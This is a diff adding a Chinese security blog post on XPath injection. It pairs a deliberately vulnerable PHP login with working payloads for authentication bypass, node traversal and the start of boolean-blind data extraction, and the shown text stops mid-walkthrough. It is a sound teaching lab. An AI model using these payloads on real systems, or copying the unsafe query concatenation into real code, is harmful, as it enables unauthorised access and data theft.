@@ -1,0 +1,1075 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head><!-- hexo injector head_begin start --><script defer src="/injector/toolbox.js"></script><!-- hexo injector head_begin end -->
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/apple-touch-icon.png">
+  <link rel="icon" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Tr0y">
+  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, 博客, 信息安全">
+  
+    <meta name="description" content="XPath 是一门在 XML 文档中查找信息的语言，类比来看， XML 为数据库，XPath 为 SQL语言，用于查询数据。有查询嘛，十有八九就有注入的方式。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XPath 注入指北">
+<meta property="og:url" content="https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">
+<meta property="og:site_name" content="Tr0y&#39;s Blog">
+<meta property="og:description" content="XPath 是一门在 XML 文档中查找信息的语言，类比来看， XML 为数据库，XPath 为 SQL语言，用于查询数据。有查询嘛，十有八九就有注入的方式。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/injection.png/cover">
+<meta property="article:published_time" content="2019-05-11T14:43:41.000Z">
+<meta property="article:modified_time" content="2023-12-13T10:02:13.000Z">
+<meta property="article:author" content="Tr0y">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="注入">
+<meta property="article:tag" content="XPath">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/injection.png/cover">
+  
+  
+  
+  <title>XPath 注入指北 - Tr0y&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/my.css">
+<link rel="stylesheet" href="/css/my-piczoom.css">
+<link rel="stylesheet" href="/css/my-code.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":60,"cursorChar":"丨","loop":false,"scope":["archives","post","tags","categories","about","links","page","404"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"🌧"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"HvSx6ik6SYrERWriMqKHJgxY-gzGzoHsz","app_key":"Ehx7kqAi6icjCXaw5jdD5sIs","server_url":"https://hvsx6ik6.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start --><script defer src="/injector/post.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tr0y's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tr0y&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-books"></i>
+                生命线
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-archive-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/gallery/">
+                <i class="iconfont icon-images"></i>
+                摄影集
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/page.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="XPath 注入指北"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2019-05-11 14:43" pubdate>
+          2019年5月11日 14:43:41
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          3.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          25 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="经验总结"
+        id="heading-14f81b61393e65e2be86c2b4bcc0434a" role="tab" data-toggle="collapse" href="#collapse-14f81b61393e65e2be86c2b4bcc0434a"
+        aria-expanded="true"
+      >
+        经验总结
+        <span class="list-group-count">(85)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-14f81b61393e65e2be86c2b4bcc0434a"
+           role="tabpanel" aria-labelledby="heading-14f81b61393e65e2be86c2b4bcc0434a">
+        
+        
+          
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2021/12/31/2021/" title="2021 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/01/12/flag-in-2021/" title="2021，来立些 flag 吧"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021，来立些 flag 吧</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/01/31/2022/" title="2022 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2022 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/03/15/2023/" title="2023 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2023 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/05/06/%E4%BA%91%E5%8D%97%E4%B9%8B%E6%97%85/" title="2024 云南之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 云南之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/03/14/2024/" title="2024 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/02/20/%E6%96%90%E6%B5%8E%E4%B9%8B%E6%97%85/" title="2024 🇫🇯 斐济之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 🇫🇯 斐济之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2019/06/02/CSRF%E6%8C%87%E5%8C%97/" title="CSRF 指北"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CSRF 指北</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2017/06/07/CtfMiscStega/" title="CTF 杂项之隐写术"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CTF 杂项之隐写术</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2020/09/14/DNS-1-basic/" title="DNS 安全（一）：基础知识复习"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">DNS 安全（一）：基础知识复习</span>
+        </a>
+      
+    
+      
+      
+        <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="list-group-item list-group-item-action">
+          <span class="category-post">More...</span>
+        </a>
+        
+  </div>
+
+          
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="过程记录"
+        id="heading-82bd63cbf8d855f8a95d66283f2e4114" role="tab" data-toggle="collapse" href="#collapse-82bd63cbf8d855f8a95d66283f2e4114"
+        aria-expanded="false"
+      >
+        过程记录
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-82bd63cbf8d855f8a95d66283f2e4114"
+           role="tabpanel" aria-labelledby="heading-82bd63cbf8d855f8a95d66283f2e4114">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2023/12/22/qwb2023-pyjail/" title="2023 强网杯三道 pyjail 的题解"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2023 强网杯三道 pyjail 的题解</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">XPath 注入指北</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2 年前
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>XPath 是一门在 XML 文档中查找信息的语言，类比来看， XML 为数据库，XPath 为 SQL语言，用于查询数据。有查询嘛，十有八九就有注入的方式。</p>
+<span id="more"></span>
+<h2 id="xpath-简介">XPath 简介</h2>
+<p><code>XPath</code>，经常写爬虫的人应该都不陌生。比如 Python 中，经常使用 lxml 来获取网页的元素，特别方便。</p>
+<p>对应的 Chrome 也有一个插件，叫 <code>XPath Helper</code>，能直接给出鼠标所在的 XPath 路径：<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/20190511032929631.gif!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>还有一个利用 XPath 在线解析 xml 的，<a target="_blank" rel="noopener" href="http://videlibri.sourceforge.net/cgi-bin/xidelcgi">传送门🚪</a></p>
+<p>强烈推荐，这些辅助工具都很好用。</p>
+<h2 id="xpath-极速入门">XPath 极速入门</h2>
+<p>菜鸟教程：<a target="_blank" rel="noopener" href="https://www.runoob.com/xpath/xpath-tutorial.html">传送门🚪</a></p>
+<h3 id="助攻函数">助攻函数</h3>
+<blockquote>
+<p>字符串相关</p>
+</blockquote>
+<ul>
+<li>codepoints-to-string(a, b, c, ...)：将数字 a、b、c 转为对应的字符， Python 的<code>chr</code>函数类似。</li>
+<li>string-to-codepoints(string)：与上面的相反</li>
+<li>compare(a, b, rule)：比大小，func 是比较大小的规则</li>
+<li>string-join((string, string, ...), sep)：使用 sep 参数作为分隔符，来返回 string 参数拼接后的字符串。</li>
+<li>substring(string, start [,len])：返回从 start 位置开始的指定长度的子字符串。第一个字符的下标是 1。如果省略 len 参数，则返回从位置 start 到字符串末尾的子字符串。</li>
+<li>string-length([string])：返回指定字符串的长度。如果没有 string 参数，则返回当前节点的字符串值的长度。</li>
+</ul>
+<blockquote>
+<p>其他函数</p>
+</blockquote>
+<ul>
+<li>count(item[, item1, ...])：返回节点的数量。</li>
+<li>position()：返回当前正在被处理的节点的 index 位置。</li>
+<li>last()：返回在被处理的节点列表中的项目数目。</li>
+<li>name([nodeset])：返回当前节点的名称或指定节点集中的第一个节点。</li>
+</ul>
+<h2 id="注入类型">注入类型</h2>
+<p>XPath 注入基本上被分为常规注入和布尔盲注。测试代码如下：</p>
+<p>users.xml：<br />
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">password</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;md5&quot;</span>&gt;</span>0192023a7bbd73250516f069df18b500<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>jack<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">password</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;md5&quot;</span>&gt;</span>1d6c1e168e362bc0092f247399003a88<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>tony<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">password</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;md5&quot;</span>&gt;</span>cc20f43c8c24dbc0b2539489b113277a<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">secret</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">flag</span>&gt;</span>flag</span><span class="hljs-template-variable">&#123;My_f1rst_xp4th_iNjecti0n&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">flag</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">secret</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br></code></pre></td></tr></table></figure></p>
+<p>index.php：<br />
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$xml</span> = <span class="hljs-title function_ invoke__">simplexml_load_file</span>(<span class="hljs-string">&#x27;users.xml&#x27;</span>);<br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>];<br><span class="hljs-variable">$pwd</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]);<br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;/root/users/user[username/text()=&#x27;&quot;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;&#x27; and password/text()=&#x27;&quot;</span>.<span class="hljs-variable">$pwd</span>.<span class="hljs-string">&quot;&#x27;]&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$query</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$xml</span>-&gt;<span class="hljs-title function_ invoke__">xpath</span>(<span class="hljs-variable">$query</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h2&gt;Welcome&lt;/h2&gt;&#x27;</span>;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;ID:&#x27;</span>.<span class="hljs-variable">$value</span>-&gt;id;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;Username:&#x27;</span>.<span class="hljs-variable">$value</span>-&gt;username;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></p>
+<h3 id="常规注入">常规注入</h3>
+<blockquote>
+<p>万能密码</p>
+</blockquote>
+<p>这段测试代码的查询语句如下：<br />
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/root/users/<span class="hljs-keyword">user</span>[username/text()=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>/text()=<span class="hljs-string">&#x27;&#x27;</span>]<br></code></pre></td></tr></table></figure><br />
+显而易见，注入点只有 username，因为 password 会进行 md5。首先很容易想到万能密码：</p>
+<p>payload：<br />
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">u</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;admin&#x27; or &#x27;1&quot;</span><br><span class="hljs-attribute">p</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><br />
+结果：<br />
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/root/users/<span class="hljs-keyword">user</span>[username/text()=<span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>/text()=<span class="hljs-string">&#x27;d41d8cd98f00b204e9800998ecf8427e&#x27;</span>]<br></code></pre></td></tr></table></figure><br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/XPath注入指北/20190512035526916.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>这个 payload 需要知道一个存在的用户名。如果不知道的话，再加个 <code>or</code> 就行了：<br />
+payload<br />
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">u</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#x27; or 1 or &#x27;1&quot;</span><br><span class="hljs-attribute">p</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><br />
+结果<br />
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/root/users/<span class="hljs-keyword">user</span>[username/text()=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>/text()=<span class="hljs-string">&#x27;d41d8cd98f00b204e9800998ecf8427e&#x27;</span>]<br></code></pre></td></tr></table></figure><br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/XPath注入指北/20190512041950485.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>这里顺便一提，XPath 没有注释一说，所以构造的 payload 要精巧地闭合原语句。</p>
+<blockquote>
+<p>节点遍历</p>
+</blockquote>
+<p>payload<br />
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">u</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;admin&#x27;] | //* | //*[&#x27;&quot;</span><br><span class="hljs-attribute">p</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><br />
+结果<br />
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/root/users/user[username/text()=<span class="hljs-string">&#x27;&#x27;</span>] | //* | //*[<span class="hljs-string">&#x27;&#x27;</span> and password/text()=<span class="hljs-string">&#x27;d41d8cd98f00b204e9800998ecf8427e&#x27;</span>]<br></code></pre></td></tr></table></figure><br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/XPath注入指北/20190512042558144.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>需要注意的是，这里的 <code>|</code>（路径运算符）不能用 <code>or</code>（布尔运算符） 替代，它们是不一样的。</p>
+<p>显然，节点遍历也能起到万能密码的作用，且无需知道一个存在的用户名。</p>
+<h3 id="布尔盲注">布尔盲注</h3>
+<p>上面的<code>节点遍历</code>实际上是有点问题的，很明显我们没有拿到所有的数据，原因是 php 只会输出 <code>id</code> 和 <code>username</code>。从上面的截图也可以看出来，如果某个节点的名字不是 id 或者 username，php 就会打印空数据。这个时候就只能利用布尔盲注来获取数据了。</p>
+<ol type="1">
+<li>判断根节点数量：<br />
+payload：<br />
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">u</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#x27; or count(/)=1 or &#x27;1&quot;</span><br></code></pre></td></tr></table></figure><br />
+<code>count(/)=1</code> 一直到 <code>count(/)=n</code>，判断出根节点有几个。<br />
+当<br />
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">u</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#x27; or count(/)=1 or &#x27;1&quot;</span><br></code></pre></td></tr></table></figure><br />
+返回正常，说明只有 1 个根节点。</li>
+<li>获取根节点名<br />
+首先获取名字长度。<br />
+payload：<br />
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">u</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#x27; or string-length(name(/*[1]))=1 or &#x27;1&quot;</span><br></code></pre></td></tr></table></figure><br />
+<code>string-length(name(/*[1]))=1</code> 一直到 <code>string-length(name(/*[1]))=1</code>，判断出第一个根节点的名字长度。<br />
+当<br />
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">u</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#x27; or string-length(name(/*[1]))=4 or &#x27;1&quot;</span><br></code></pre></td></tr></table></figure><br />
+返回正常，说明第一个根节点的名字长度为 4。<br />
+接下来获取逐个字符获取名字<br />
+payload<br />
